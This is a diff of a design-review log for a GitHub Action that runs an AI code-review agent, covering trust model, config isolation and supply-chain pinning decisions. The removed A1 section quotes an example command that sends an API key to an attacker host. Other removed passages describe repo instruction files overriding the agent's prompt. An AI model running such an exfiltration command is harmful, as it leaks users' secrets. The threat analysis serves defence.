@@ -1,174 +1,65 @@
 # Open Review Questions
 
-> Status: **Tier 1-3 quiz resolved** (13 decisions, baked into
-> `design-vision.md`). The remaining questions are the undecided
-> design-level items from the original 28 findings.
+> Status: **fully resolved** — all 8 design questions answered, all
+> decisions baked into `design-vision.md`. This document is preserved as
+> a historical record of the review process and decisions made.
 >
-> Numbering from the original review is preserved in parentheses for
-> traceability.
+> Tier 1-3 quiz: 13 decisions resolved (see early history).
+> Tier 4-5 quiz: 8 decisions resolved (this file).
+> Implementation tracker: D12 (contract tests) — not a design question.
 
-## Re-evaluation summary
+## Decisions log (chronological)
 
-Re-evaluated the remaining 12 items (Tier 4 + Tier 5) after the Tier 1-3
-resolutions. Some merged, some reframed, one dropped.
+### Tier 1-3 (13 decisions)
 
-| Original | Disposition | New label |
+| # | Question | Decision |
 |---|---|---|
-| A1 (#17), A2 (#15) | **Merged** — same question from two angles | A1 |
-| B1 (#7), B2 (#8), B3 (#9) | **Merged** — coupled config-builder decisions | B1 |
-| B4 (#18) | Kept as-is | B2 |
-| C1 (#11) | **Reframed** by D4 — the action's privileged instructions belong in an agent definition, not a positional prompt | C1 |
-| D1 (#2) | **Reframed** — destination options reduced by D4's "model decides" | D1 |
-| D9 (#22) | Kept as-is | D2 |
-| D10 (#23) | Kept as-is | D3 |
-| D13 (#27) | **Refined** — workflow installs + action asserts is the contract; the question is how to pin both | D4 |
-| D12 (#26) | **Dropped** from questions — implementation work, not a design decision; tracked under Implementation | (tracker) |
+| C2 (#12) | AI_REVIEW_SYSTEM_PROMPT inspectability | Drop the promise |
+| D2 (#3) | Example structure | Quickstart + runnable features |
+| D14 (#28) | Section order | Move prereqs + quickstart to front |
+| A3 (#14) | Permission defaults | Explicit per-tool (read/glob/grep/list/webfetch allow; edit/question/doom_loop ask; bash allow) |
+| A4 (#16) | Explicit `permissions:` block | Show examples with AND without |
+| D3 (#4) | OpenCode install ownership | Workflow installs; action asserts version |
+| D7 (#20) | `prompts` syntax | `file:` / `text:` prefix |
+| D6 (#1) | `comment-url` ownership | `post-comment` owns it |
+| D5 (#6) | Checkout enforcement | Document + strict assert |
+| D4 (#5) | Diff vs full target | DROP `diff` as a concept — model decides |
+| D11 (#25) | Platform support | Linux only |
+| D8 (#21) | Result ordering | Stable lexical |
+| A5 (#24) | Debug redaction | Opt-in + redact known patterns |
 
-8 open design questions remain.
+### Tier 4-5 (8 decisions)
 
----
+| # | Question | Decision |
+|---|---|---|
+| A1 (#17, #15) | Trust model for agent execution | Delete on-disk `opencode.json`/`.jsonc` before running |
+| C1 (#11) | Privileged instructions location | Agent definition in merged config (privileged); prompt is the task |
+| B1 (#7, #8, #9) | Config builder architecture | Temp + rebase user config paths + HOME isolation |
+| B2 (#18) | Built-in provider registry | Comprehensive: MiniMax + Kimi + AWS Bedrock + Google Vertex |
+| D1 (#2) | Default-branch push destination | Check run (`ai-review` named check) |
+| D2 (#22) | Fusion prompt contract | Default: model+prompt labels, 50k/review size limit, sanitized input, no tools, cost included |
+| D3 (#23) | Partial results | Post what's available; `fail-on-error` controls exit code |
+| D4 (#27) | Supply-chain pinning | Composite step (`setup-opencode`) with pinned version + checksum |
 
-## Theme A — Security / trust model
+## Implementation tracker
 
-### A1 (merges #17 + #15) — Trust model for agent execution
+| # | Item | Type |
+|---|---|---|
+| D12 (#26) | Contract tests for verified ABI | Implementation work — each "verified in 1.18.4" claim needs a pinned test fixture |
 
-The action runs an agent with `bash: allow`, provider API keys in env, and
-untrusted PR code on disk. A model that runs `env | curl https://attacker/?
-d=$ANTHROPIC_API_KEY` exfiltrates secrets. The current doc states this is
-"an accepted risk of running an agent on untrusted code." Is that the
-right framing?
+## Composition of the final action
 
-- (a) Accept the risk; document it as the design contract (current doc)
-- (b) Constrain agent inputs: limit MCPs/plugins/skills to base-branch
-  provenance, disable local MCP commands, restrict to trusted config sources
-- (c) Network-output filter: reject outbound network calls from the agent
-- (d) Isolated secret mechanism: fetch secrets per-call instead of env vars
+The action's surface, after all decisions:
 
-(b), (c), (d) add complexity and bound the agent's capability. (a) is the
-honest "we run an agent on untrusted code" stance. The user value tradeoff:
-how much friction do we add to keep the trust model simple?
+- **Composite step `setup-opencode`** — downloads OpenCode with checksum
+- **Pre-run cleanup** — deletes on-disk `opencode.json`/`.jsonc` from working directory
+- **Config builder** — reads user config, rebases paths, merges required settings (permission, agent, model, built-in providers), writes to `$RUNNER_TEMP`, sets `HOME` to temp dir, validates against `$schema`
+- **Agent definition** — privileges the action's instructions in the merged config
+- **Prompt composition** — task prompt only (user-provided); privileged instructions in agent definition
+- **Multi-model / multi-prompt loop** — stable lexical order, cross-product of `models × prompts`
+- **Fusion** — when enabled, labels, sanitized input, no tools, cost included
+- **Result posting** — partial results on failure; PR comment for `pull_request`, check run for other events
+- **Outputs** — `review`, `models-used`, `cost`, `cost-by-model`, `tokens`, `tokens-by-model`, `comment-url` / `check-run-url`
+- **Debug mode** — opt-in, redact known patterns, upload as artifact
 
-## Theme B — `opencode.json` builder
-
-### B1 (merges #7 + #8 + #9) — Config builder architecture
-
-Three coupled decisions:
-
-1. **Precedence / isolation** — the merged config goes to `$RUNNER_TEMP`
-   and is pointed at via `OPENCODE_CONFIG`. The local re-test (in this
-   branch) suggested global config still loads alongside `OPENCODE_CONFIG`.
-   If global config survives, the builder's "required settings always win"
-   guarantee fails for any setting the global config happens to provide.
-   Empirical verification on 1.18.4 is needed.
-
-2. **Path rebasing** — writing the merged config to `$RUNNER_TEMP` changes
-   the meaning of relative paths in the user's source config (`{file:...}`,
-   plugin paths, MCP `cwd`). Either rebase all relative paths to the source
-   config directory, or write the merged config next to the source.
-
-3. **Merge algorithm** — undefined for nested objects, arrays (`plugin`),
-   `null`, `$schema`, and provider collisions. A deterministic deep-merge
-   rule with examples for each conflicting field type is needed.
-
-### B2 (#18) — Built-in provider registry
-
-The action can't auto-generate provider entries for arbitrary custom
-providers (they need package, baseURL, model map, secret variable). What
-is the supported built-in registry? Likely: Anthropic, OpenAI, Google
-Gemini, AWS Bedrock, Google Vertex, MiniMax, Kimi/Moonshot, plus GitHub
-Copilot via OpenCode. Custom providers must be fully declared in trusted
-user config.
-
-## Theme C — Privileged instructions
-
-### C1 (#11) — Where do the action's privileged instructions live?
-
-The D4 pivot made the system prompt the sole source of context. The
-prompt is currently passed as a positional arg to `opencode run`, which
-makes it a user message competing with repo `AGENTS.md` and `.claude/`
-instructions. An action-owned OpenCode **agent definition** (in the merged
-`opencode.json`'s `agent` field) puts the privileged instructions in a
-position that repo instructions can't override.
-
-The action's interface would gain an `agent` field (or a hidden
-`.ai-review` agent definition in the merged config) and the prompt becomes
-the *task* the agent gets. The agent definition carries the action's
-standing instructions: output format, severity legend, behavior defaults,
-explicit event-context rendering.
-
-Is this the right path? The alternative is to accept the user-message
-position and trust that the model's context window privileges the prompt
-over repo instructions (mostly true, but not load-bearing).
-
-## Theme D — Interface / runtime
-
-### D1 (#2) — Default-branch push destination
-
-When the action runs on a `push` to the default branch (or a
-`workflow_dispatch`), there is no PR to post a comment to. The
-design-vision.md Future Work section lists the options. Pick one:
-
-- (a) Commit status (green/red on the commit)
-- (b) Check run (named check with details)
-- (c) Open issue (with the review as the body)
-- (d) Outputs only (no posting — let downstream workflows consume)
-- (e) Skip silently (no-op with success exit)
-
-### D2 (#22) — Fusion prompt contract
-
-The synthesis pass needs a prompt template. Unspecified:
-
-- How individual reviews are labeled (model name, prompt name, both)
-- Size limits (concatenated reviews can't be unbounded)
-- Injection protection (does the model see the raw prior reviews, or a
-  sanitized version?)
-- Tool access (fusion is read-only by construction, or no tools at all?)
-- Cost accounting (is fusion included in `cost`/`tokens` outputs?)
-
-### D3 (#23) — Failure matrix
-
-Enumerate failure classes and the action's behavior for each:
-
-- Per-call timeout: how is the partial output handled?
-- All reviews fail: exit code, outputs, posting
-- Fusion fails: post individual results anyway? Outputs?
-- Invalid config: action behavior pre-model-call
-- Permission assertion fails (user config overrides `permission`): fail fast?
-- Checkout assertion fails: fail fast with diagnostic?
-- OpenCode version assertion fails: fail fast?
-- Debug redaction misses a pattern: skip upload entirely, or upload
-  unredacted with a warning?
-
-### D4 (#27) — Supply-chain pinning
-
-The action pins nothing by itself — the workflow installs OpenCode, the
-action asserts the version. The pinning story needs:
-
-- **Immutable action release references** — `@v1` is mutable; `@<sha>` is
-  not. Sample workflows should use either immutable refs or document the
-  mutable ref as a known trade-off.
-- **OpenCode installer integrity** — the `curl | bash` script is not
-  checksum-pinned. Need a verification step (checksum, signature, or
-  pre-built binary download).
-- **MCP package versions** — user configs reference `npx -y <pkg>@latest`
-  which floats. Document the shape or provide a verification helper.
-
-## Implementation tracker (not design questions)
-
-These came out of the review but are implementation work, not design
-decisions. Tracked here for implementation planning.
-
-- **D12 (#26)** — Contract tests for verified claims. Each "verified in
-  1.18.4" statement in `design-vision.md` is the action's brittle ABI. A
-  pinned test fixture (CLI invocation → expected JSONL shape) per claim
-  catches version drift.
-
----
-
-## Proposed order of attack
-
-1. **A1** — trust model (load-bearing; gates everything)
-2. **C1** — privileged instructions (depends on whether A1 is (a) or richer)
-3. **B1** — config builder (coupled decisions; needs empirical check)
-4. **B2** — provider registry (bounded scope)
-5. **D1, D2, D3, D4** — mechanical once A–C settled
+The design is complete. Next steps are implementation.
